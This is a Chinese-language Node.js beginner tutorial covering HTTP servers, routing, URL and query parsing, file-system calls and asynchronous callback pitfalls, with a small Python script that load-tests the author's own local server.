<h1 id="Nodejs适合做什么？"><a href="#Nodejs适合做什么？" class="headerlink" title="Nodejs适合做什么？"></a>Nodejs适合做什么？</h1><p>​    善于I/O，不善于计算。因为Nodejs最擅长的就是任务调度，如果你的业务有很多CPU计算，实际上也相当于计算阻塞了这个单线程。</p>
<p>​    当应用程序需要处理大量并发I/O，而向客户端发出响应之前，应用程序内部不需要进行复杂处理的时候，Nodejs非常合适。Nodejs也非常合适与web socket配合，开发长连接（长连接实际上是通过大量请求模拟长连接）的实时交互应用程序。</p>
<p>比如</p>
<ul>
<li>用户表单收集</li>
<li>考试系统</li>
<li>聊天室</li>
<li>图文直播</li>
<li>提供JSON的API</li>
</ul>
<p>Nodejs本身就是极客追求性能极致的产物，缺少了服务器的健壮考量。所以Node不可能应用在极高可靠性的业务中。</p>
<h1 id="Hello-Node"><a href="#Hello-Node" class="headerlink" title="Hello Node"></a>Hello Node</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//require表示导包</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="comment">//创建服务器，参数是一个回调函数，表示如果有什么请求进来，要做什么</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123; </span><br><span class="line">    <span class="comment">// req表示请求，request；res表示响应，response</span></span><br><span class="line">    <span class="comment">// 设置HTTP头部，状态码200，文件类型html，字符集utf8</span></span><br><span class="line">    res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF-8"</span>&#125;);</span><br><span class="line">    res.end(<span class="string">"Hello NodeJS"</span>);</span><br><span class="line"></span><br><span class="line"> &#125;)</span><br><span class="line"><span class="comment">//运行服务器，监听3000端口，任何地址都可以访问</span></span><br><span class="line"> server.listen(<span class="number">3000</span>,<span class="string">"0.0.0.0"</span>);</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2020/04/29/iVcvReodCyXm7t6.png" alt="image-20200427105856751.png"></p>
<p>NodeJS是服务器语句，写的js语句都将运行在服务器上，返回给客户的，都是已经处理好的纯HTML。如果想修改程序，必须中断当前程序，然后重新启动node，不支持热部署。</p>
<h1 id="Nodejs路由"><a href="#Nodejs路由" class="headerlink" title="Nodejs路由"></a>Nodejs路由</h1><p>Node.JS没有根目录，因为它没有web容器的概念。</p>
<p>先写一个静态的H5页面：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.app</span>&#123;</span></span><br><span class="line">            background-color: red;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Nodejs读取文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"app"</span>&gt;</span>这是一个测试文件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果大概是这样：</p>
<img src="https://i.loli.net/2020/04/29/U5NCRwMdscT1KVn.png" alt="image-20200427210543157" style="zoom:33%;" />

<ol>
<li>使用req.url判断输入的路径</li>
<li>使用fs.readFile()读取网页页面</li>
<li>使用res.end()返回数据</li>
</ol>
<p>然后写staticRender.js文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(req.url == <span class="string">"/red"</span>)&#123;</span><br><span class="line">        <span class="comment">// 输入路由和源文件没有关系</span></span><br><span class="line">        fs.readFile(<span class="string">"./red.html"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">            res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF-8"</span>&#125;);</span><br><span class="line">            res.end(data);</span><br><span class="line">    </span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(req.url == <span class="string">"/blue"</span>)&#123;</span><br><span class="line">        fs.readFile(<span class="string">"./blue.html"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">            res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF-8"</span>&#125;);</span><br><span class="line">            res.end(data);</span><br><span class="line">    </span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.writeHead(<span class="number">404</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF-8"</span>&#125;);</span><br><span class="line">        res.end(<span class="string">"没有这个页面"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> server.listen(<span class="number">3000</span>,<span class="string">"0.0.0.0"</span>);</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2020/04/29/U5NCRwMdscT1KVn.png" alt="image-20200427210543157" style="zoom:33%;" />

<img src="https://i.loli.net/2020/04/29/CjBTplzuqLcP5x8.png" alt="image-20200428123714399" style="zoom:33%;" />



<p>NodeJS任何静态页面都需要路由，比如在HTML中插入一个image或者css样式，也需要设置一条路由。Nodejs擅长做顶层路由设计。</p>
<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>Nodejs中，讲很多的功能划分为了一个个module。</p>
<h2 id="HTTP模块"><a href="#HTTP模块" class="headerlink" title="HTTP模块"></a>HTTP模块</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引用模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123; </span><br><span class="line">    <span class="comment">//req参数表示请求，res表示响应</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"服务器接收到了请求"</span>+req.url);</span><br><span class="line">    <span class="comment">//告诉浏览器连接终止</span></span><br><span class="line">    res.end(); <span class="comment">//end中必须是字符串或者缓冲区</span></span><br><span class="line"> &#125;);</span><br><span class="line"> server.listen(<span class="number">3000</span>,<span class="string">"0.0.0.0"</span>);</span><br></pre></td></tr></table></figure>



<p>向请求发送响应头，此方法只能在消息上调用一次，并且必须在调用 response.end() 之前调用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF-8"</span>&#125;);</span><br></pre></td></tr></table></figure>



<p>req的属性，最关键的就是req.url属性，表示用户请求的URL地址，所有路由设计，都是通过req.url来实现的，我们比较关心的不是拿到URL，而是识别这个URL。</p>
<p>识别URL用到两个模块，一个是url模块，另一个是querystring模块。</p>
<h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><p>用于解析url，这样就可以不用正则表达式了</p>
<p><a href="http://nodejs.cn/api/url.html#url_url_strings_and_url_objects" target="_blank" rel="noopener">http://nodejs.cn/api/url.html#url_url_strings_and_url_objects</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">"url"</span>);</span><br><span class="line"><span class="comment">//url.parse()可以将一个完整的URL地址分为很多部分</span></span><br><span class="line">myURL=url.parse(<span class="string">'https://user:pass@sub.host.com:8080/p/a/t/h?query=string#hash'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(myURL.host);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// url.host 获取及设置 URL 的主机部分。</span></span><br><span class="line">    <span class="comment">// url.hostname 获取及设置 URL 的主机名部分。 url.host 和 url.hostname 之间的区别是 url.hostname 不包含端口。</span></span><br><span class="line">    <span class="comment">// url.password 获取及设置 URL 的密码部分。</span></span><br><span class="line">    <span class="comment">// url.pathname 获取及设置 URL 的路径部分。</span></span><br><span class="line">    <span class="comment">// url.port 获取及设置 URL 的端口部分。</span></span><br><span class="line">    <span class="comment">// url.protocol 获取及设置 URL 的协议部分。</span></span><br><span class="line">    <span class="comment">// url.username 获取及设置 URL 的用户名部分。</span></span><br><span class="line">    <span class="comment">// url.query 获取及设置URL的查询部分 &amp;name=jack&amp;age=18</span></span><br><span class="line">    <span class="comment">// url.parse(req.url,true).query = &gt; </span></span><br><span class="line">    <span class="comment">// [Object: null prototype] &#123; name: 'jack', age: '18' &#125;</span></span><br><span class="line">    <span class="comment">// [Object: null prototype] &#123; name: 'jack', age: '18' &#125;</span></span><br><span class="line"></span><br><span class="line">url.parse(<span class="string">'url'</span>,<span class="literal">true</span>); <span class="comment">//如果第二个参数是true，那么就可以把所有的查询变为对象 ， 就可以直接打点得到这个参数。</span></span><br></pre></td></tr></table></figure>



<p>表单提交案例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>表单提交<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:3000"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"age"</span>/&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"男"</span>/&gt;</span>男</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"女"</span>/&gt;</span>女<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>提交到浏览器的结果为：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:3000/?name=杜振铨&amp;age=21&amp;sex=男</span><br></pre></td></tr></table></figure>

<p>然后在Nodejs服务端用url解析出来</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">"url"</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">    myURL=url.parse(req.url,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> info = <span class="string">"服务器收到了 - 姓名："</span>+myURL.query.name + <span class="string">"性别："</span>+myURL.query.sex + <span class="string">"年龄："</span>+myURL.query.age;</span><br><span class="line">    <span class="comment">// 这里要用UTF8不然中文乱码</span></span><br><span class="line">    res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF8"</span>&#125;);</span><br><span class="line">    res.end(info);</span><br><span class="line"> &#125;).listen(<span class="number">3000</span>,<span class="string">"0.0.0.0"</span>);</span><br></pre></td></tr></table></figure>

<p>最后在网页上呈现这样的效果：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器收到了 - 姓名：杜振铨 性别：男 年龄：21</span><br></pre></td></tr></table></figure>



<p>简单的路由演示：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// http://127.0.0.1:3000/teacher/122456</span></span><br><span class="line">    <span class="comment">//提取出url,为/teacher/123456</span></span><br><span class="line">    <span class="keyword">var</span> myurl = req.url;</span><br><span class="line">    <span class="built_in">console</span>.log(myurl);</span><br><span class="line"></span><br><span class="line">    res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF8"</span>&#125;);</span><br><span class="line">    <span class="comment">//比较前9位 [0,9)</span></span><br><span class="line">    <span class="keyword">if</span>(myurl.substr(<span class="number">0</span>,<span class="number">9</span>) == <span class="string">"/teacher/"</span>)&#123;</span><br><span class="line">        <span class="comment">//取出从第九位开始往后的,这里就是123456</span></span><br><span class="line">        tearcherid = myurl.substr(<span class="number">9</span>);</span><br><span class="line">        <span class="comment">//看取出来的id是否满足6位数字,不满足则返回不存在,学生栏也一样</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="regexp">/^\d&#123;6&#125;$/</span>.test(tearcherid))&#123;</span><br><span class="line">            res.end(<span class="string">"您要查询的老师信息为 id:"</span>+tearcherid);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.end(<span class="string">"您访问的老师不存在!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span>(myurl.substr(<span class="number">0</span>,<span class="number">9</span>) == <span class="string">"/student/"</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> studentid = myurl.substr(<span class="number">9</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="regexp">/^\d&#123;10&#125;$/</span>.test(studentid))&#123;</span><br><span class="line">            res.end(<span class="string">"您要查询的学生信息为 id:"</span>+studentid);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.end(<span class="string">"您访问的学生不存在!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.end(<span class="string">"您访问的人员不存在!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="string">"0.0.0.0"</span>);</span><br></pre></td></tr></table></figure>







<h2 id="fs"><a href="#fs" class="headerlink" title="fs"></a>fs</h2><ol>
<li>readFile读取文件</li>
<li>mkdir 新建文件夹</li>
<li>rmdir 移除文件夹</li>
<li>fs.Stats 查看文件属性<ol>
<li>stats.isBlockDevice()</li>
<li>stats.isCharacterDevice()</li>
<li>stats.isDirectory()</li>
<li>stats.isFIFO()</li>
<li>stats.isFile()</li>
<li>stats.isSocket()</li>
<li>….</li>
</ol>
</li>
<li></li>
</ol>
<p>读取文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 三个参数,第一个是完整的路径,当前目录写./</span></span><br><span class="line">   <span class="comment">// 第二个参数是字符集,也可以不设置</span></span><br><span class="line">   <span class="comment">// 第三个参数是回调函数,表示文件读取成功后,做的事</span></span><br><span class="line">   fs.readFile(<span class="string">"./demo.txt"</span>,&#123;<span class="string">"charset"</span>:<span class="string">"utf-8"</span>&#125;,<span class="function"><span class="keyword">function</span> (<span class="params">err,data</span>) </span>&#123; </span><br><span class="line">       <span class="comment">// 抛异常</span></span><br><span class="line">       <span class="keyword">if</span>(err)&#123;</span><br><span class="line">           <span class="keyword">throw</span> err;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">console</span>.log(userid+<span class="string">"文件读取完毕!"</span>);</span><br><span class="line">       res.end(data);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>



<p>利用读取文件，验证事件环，即NodeJS的单进程异步非阻塞事件驱动模型。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> userid = <span class="built_in">parseInt</span>(<span class="built_in">Math</span>.random() * <span class="number">10000</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(userid);</span><br><span class="line">    res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF8"</span>&#125;);</span><br><span class="line">    fs.readFile(<span class="string">"./demo.txt"</span>,&#123;<span class="string">"charset"</span>:<span class="string">"utf-8"</span>&#125;,<span class="function"><span class="keyword">function</span> (<span class="params">err,data</span>) </span>&#123; </span><br><span class="line">        <span class="built_in">console</span>.log(userid+<span class="string">"文件读取完毕!"</span>);</span><br><span class="line">        res.end(data);</span><br><span class="line">     &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="string">"0.0.0.0"</span>);</span><br></pre></td></tr></table></figure>

<p>通过访问 <a href="http://127.0.0.1:3000" target="_blank" rel="noopener">http://127.0.0.1:3000</a></p>
<p>我们可以看到如下</p>
<p>5435<br>5435文件读取完毕!</p>
<p>现在我们模拟1000并发</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">url = <span class="string">"http://127.0.0.1:3000"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span><span class="params">()</span>:</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    print(response.status_code)</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    t = Thread(target=req,)</span><br><span class="line">    t.start()</span><br><span class="line">    l.append(t)</span><br><span class="line">[ i.join() <span class="keyword">for</span> i <span class="keyword">in</span> l]</span><br><span class="line">print(<span class="string">"完成!"</span>)</span><br></pre></td></tr></table></figure>



<p>然后就可以看到</p>
<p>6182<br>9997<br>6182文件读取完毕!<br>9997文件读取完毕!<br>3450<br>3450文件读取完毕!</p>
<p>可以发现，NodeJS在处理当前用户的时候，还会切换到另外的事件调度。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">//recursive 多级目录需要递归创建 </span></span><br><span class="line">fs.mkdir(<span class="string">"./ablum/niki"</span>,&#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;,(err) =&gt;&#123;</span><br><span class="line">        <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>



<h2 id="fs处理异步问题"><a href="#fs处理异步问题" class="headerlink" title="fs处理异步问题"></a>fs处理异步问题</h2><ol>
<li>由于异步性，下面的语句会在回调函数之前执行</li>
<li>所以console.log()已经把文件夹输出了，但事实上for循环并没有开始遍历</li>
<li>三层回调涉及到的方法<ol>
<li>http.createServer()创建一个服务器</li>
<li>fs.readdir() 读取目录下文件和文件夹</li>
<li>fs.stat() 读取文件或者文件夹的状态</li>
</ol>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.url == <span class="string">"/favicon.ico"</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.writeHead(<span class="number">200</span>,&#123;<span class="string">"Content-type"</span>:<span class="string">"text/html;charset=UTF8"</span>&#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 定义一个变量，用来存放目录</span></span><br><span class="line">    <span class="keyword">var</span> dirs = []</span><br><span class="line">    <span class="comment">// 读取./ablum下的所有文件,包括文件和文件夹</span></span><br><span class="line">    fs.readdir(<span class="string">"./ablum"</span>,<span class="function"><span class="keyword">function</span> (<span class="params">err,files</span>) </span>&#123; </span><br><span class="line">        <span class="built_in">console</span>.log(files.length);</span><br><span class="line">        <span class="comment">// 便利这些文件和文件夹,找到其中是文件夹的,将其放入dirs</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;files.length;i++)&#123;</span><br><span class="line">            <span class="keyword">var</span> path = <span class="string">"./ablum/"</span>+files[i];</span><br><span class="line">            fs.stat( path,<span class="function"><span class="keyword">function</span>(<span class="params">err,stats</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(stats.isDirectory())&#123;</span><br><span class="line">                    dirs.push(path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 由于异步,上面的函数执行完了会立刻执行下面的函数,也就是说,上面还没开始遍历,下面已经执行了.所以这里的dirs是[]空的</span></span><br><span class="line">        <span class="built_in">console</span>.log(dirs);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    res.end(<span class="string">"Success"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="string">"0.0.0.0"</span>);</span><br></pre></td></tr></table></figure>



<p>解决办法：迭代器——循环强制同步</p>
